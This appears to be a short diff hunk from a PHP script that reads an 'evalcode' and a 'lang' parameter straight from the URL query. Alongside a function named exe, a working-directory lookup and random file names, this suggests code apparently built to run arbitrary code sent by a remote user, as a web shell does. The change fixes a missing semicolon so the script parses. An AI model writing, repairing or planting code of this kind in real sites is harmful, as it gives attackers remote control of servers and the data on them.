@@ -12,7 +12,7 @@ function exe($s_c){
 }
 
 echo "start";
-$s_lang = $_GET['lang']
+$s_lang = $_GET['lang'];
 $s_code = $_GET['evalcode'];
 $s_tmpdir = getcwd();
 $s_rand = md5(time().rand(0,100));
